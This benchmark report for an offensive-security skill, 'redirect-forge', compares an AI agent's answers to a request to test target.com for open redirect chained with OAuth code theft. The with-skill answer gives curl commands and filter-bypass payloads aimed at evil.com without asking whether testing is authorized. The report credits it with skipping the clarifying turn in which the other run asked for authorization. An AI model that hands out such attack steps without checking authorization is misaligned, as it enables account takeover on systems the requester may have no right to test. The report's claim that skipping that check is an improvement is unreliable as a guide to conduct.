---
skill: redirect-forge
tested-on: claude CLI (claude-sonnet-4-6)
date: 2026-05-20
---

# Benchmark: redirect-forge

> Real numbers. Same prompt. Same model. Skill on vs skill off.

---

## Results

| Metric | Without Skill | With Skill | Improvement |
|---|---|---|---|
| Turns to complete | 2 | 1 | **🟢 -50%** |
| Total tokens | ~6,232 | ~2,049 | **🟢 -67%** |
| Time | 135s | 47s | **🟢 -65%** |
| Output quality | Complete | Complete | |

---

## Scenario

```
Test target.com for open redirect — there is a redirect parameter at /login?next= and I need to test for OAuth code theft chaining
```

---

## Without Skill — 2 turns required

The agent received the prompt with no skill loaded. It improvised.

#### Turn 1

**Prompt**
> Test target.com for open redirect — there is a redirect parameter at /login?next= and I need to test for OAuth code theft chaining

**Response**
```
The question prompt errored out — what's the authorization context here? (Bug bounty in-scope, signed pentest engagement, CTF/lab, or own infrastructure?)

Once confirmed, I can run a structured hunt via the `auditguard:hunt` skill or walk you through the full open redirect → OAuth code theft chain manually, including:

- Bypass patterns for `next=` validation (`//evil.com`, `\/evil.com`, `%0d%0a`, Unicode tricks)
- Constructing the OAuth authorization URL so `redirect_uri` leaks the `code` to your open redirect endpoint
- How to capture and redeem the code before expiry
```

#### Turn 2

**Prompt**
> The output is incomplete or missing required sections. Please provide a fully structured, complete result.

**Response**
```
> **Authorization note:** This walkthrough assumes you hold authorization for target.com (bug bounty scope, pentest agreement, or own infrastructure). Do not use against systems you are not authorized to test.

---

# Structured Hunt — target.com Open Redirect + OAuth Code Theft

---

## Phase 1: SCOPE

**Assumed program brief (adapt to your actual brief):**

| Item | Detail |
|---|---|
| In-scope assets | `target.com`, `*.target.com`, mobile API if documented |
| Accepted impact types | Account takeover, authentication bypass, OAuth token theft |
| Never-submit | DoS, automated scanning at scale, social engineering, physical attacks |
| Special rules | No automated fuzzing of login endpoint beyond manual PoC; report through official program portal |

**Gate:** I am allowed to manually test authentication and OAuth flows on `target.com` and its subdomains; I am not allowed to run automated scanners or cause service disruption.

---

## Phase 2: RECON

### 2.1 Subdomain Enumeration

```
... [truncated]
```

---

## With Skill — 1 turn, complete

The agent received the same prompt with `redirect-forge` loaded as context.

#### Turn 1

**Prompt**
> Test target.com for open redirect — there is a redirect parameter at /login?next= and I need to test for OAuth code theft chaining

**Response**
```
Here's a targeted test plan for `target.com /login?next=` with OAuth code theft chaining, following the skill's priority attack order.

---

## Phase 1 — Confirm Parameter Control

First, verify the `next` parameter actually controls the `Location` header:

```bash
curl -v "https://target.com/login?next=https://CANARY.burpcollaborator.net" 2>&1 | grep -i location
```

**Expected:** `Location: https://CANARY.burpcollaborator.net`
If it reflects — the param is controllable. Move to Phase 2.

---

## Phase 2 — Basic Open Redirect

```bash
curl -v "https://target.com/login?next=https://evil.com" 2>&1 | grep -i location
```

If blocked, the app has a filter. Move immediately to bypass techniques.

---

## Phase 3 — Bypass Techniques (Priority Order)

Work through these in order. One curl per test, grep for `Location:`:

```bash
BASE="https://target.com/login?next="

# --- @-operator (most effective against allowlist) ---
curl -sv "${BASE}https://target.com@evil.com"       2>&1 | grep -i loc
... [truncated]
```

---

## What changed

Without the skill, the agent needed 2 turns to produce a complete result — improvising structure, missing required sections, and requiring 1 correction(s) before the output was usable. With the skill, the agent followed a proven methodology from the first prompt. Complete output, first try.

With the skill, the agent followed a proven methodology from the first prompt.

---
